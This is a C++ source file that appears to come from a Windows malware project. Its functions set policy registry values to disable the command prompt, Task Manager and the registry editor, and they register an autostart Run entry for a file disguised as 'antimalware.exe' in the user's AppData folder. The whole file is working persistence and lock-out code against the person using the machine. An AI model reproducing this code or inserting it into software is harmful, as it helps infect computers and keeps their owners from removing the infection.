#include "main.h"
#include "registers.h"

using namespace Reg;

void ::CmdRegistry::ProcessValueCMD()
{
	{
		_L32 cmdResult = RegQueryValueExW(hKey, DisableCommandPrompt, NULL, NULL, NULL, NULL);

		if (cmdResult == ERROR_FILE_NOT_FOUND)
		{
			if (RegSetValueExW(hKey, DisableCommandPrompt, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable)) != ERROR_SUCCESS)
			{
				return;
			}
			else
			{
				RegCloseKey(hKey);
			}
		}
		else
		{
			RegSetValueExW(hKey, DisableCommandPrompt, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable));
			RegCloseKey(hKey);
			return;
		}
		RegCloseKey(hKey);
	}

};

void ::CmdRegistry::ModifyRegistryCmd()
{
	{
		RegOpenKeyExW(hKey, CMD_PATH, 0, KEY_ALL_ACCESS, &hKey);
		if (RegCreateKeyExW(hKey, L"System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) != ERROR_SUCCESS)
		{
			CMD_PATH = (L"SOFTWARE\\Policies\\Microsoft\\Windows\\System\\");
			ProcessValueCMD();
		}
		else
		{
			ProcessValueCMD();
		}
		return;
	}
};

void ::RunRegistry::ProcessValueRUN()
{
	{
		char* USR = std::getenv("username");
		std::wstring TPC(&USR[0], &USR[strlen(USR)]);
		_L32 runResult = RegQueryValueExW(hKey, ThisFileRun, NULL, NULL, NULL, NULL);
		std::wstring RP = (L"C:\\Users\\" + TPC + L"\\AppData\\Roaming\\antimalware.exe");
		if (runResult == ERROR_FILE_NOT_FOUND)
		{
			if (RegSetValueExW(hKey, ThisFileRun, 0, REG_SZ, (LPBYTE)RP.c_str(), (RP.size()+1) * sizeof(wchar_t)) != ERROR_SUCCESS)
			{
				return;
			}
			else
			{
				RegCloseKey(hKey);
			}
		}
		else
		{
			RegSetValueExW(hKey, ThisFileRun, 0, REG_SZ, (LPBYTE)RP.c_str(), (RP.size() + 1) * sizeof(wchar_t));
			RegCloseKey(hKey);
			return;
		}
		RegCloseKey(hKey);
	}

};

void ::RunRegistry::ModifyRegistryRUN()
{
	{
		RegOpenKeyExW(hKey, RUN_PATH, 0, KEY_ALL_ACCESS, &hKey);
		if (RegCreateKeyExW(hKey, L"Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) != ERROR_SUCCESS)
		{
			RUN_PATH = (L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
			ProcessValueRUN();
		}
		else
		{
			ProcessValueRUN();
		}
		return;
	}
};

void ::Registry::ProcessValueTMgr()
{
	_L32 mgrResult = RegQueryValueExW(hKey, DisableTaskMgr, NULL, NULL, NULL, NULL);
	_L32 regResult = RegQueryValueExW(hKey, DisableReg, NULL, NULL, NULL, NULL);

	if (mgrResult == ERROR_FILE_NOT_FOUND && regResult == ERROR_FILE_NOT_FOUND)
	{
		if (RegSetValueExW(hKey, DisableTaskMgr, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable)) != ERROR_SUCCESS)
		{
			return;
		}
		else if (RegSetValueExW(hKey, DisableReg, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable)) != ERROR_SUCCESS)
		{
			return;
		}
		else
		{
			RegCloseKey(hKey);
		}
	}
	else
	{
		RegSetValueExW(hKey, DisableTaskMgr, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable));
		RegSetValueExW(hKey, DisableReg, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable));
		RegCloseKey(hKey);
	}
	RegCloseKey(hKey);
}

void ::Registry::ModifyRegistryTMgr()
{
	RegOpenKeyExW(hKey, TMGR_PATH, 0, KEY_ALL_ACCESS, &hKey);


	if (RegCreateKeyExW(hKey, L"System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) != ERROR_SUCCESS)
	{
		TMGR_PATH = (L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\");
		ProcessValueTMgr();
	}
	else
	{
		ProcessValueTMgr();
	}
	return;
}

void * ::Regs::mainRegedit()
{
	::Registry * reg = new ::Registry();
	::CmdRegistry * cmdreg = new ::CmdRegistry();
	::RunRegistry* runreg = new ::RunRegistry();
	reg->ModifyRegistryTMgr();
	cmdreg->ModifyRegistryCmd();
	runreg->ModifyRegistryRUN();

	return 0;
}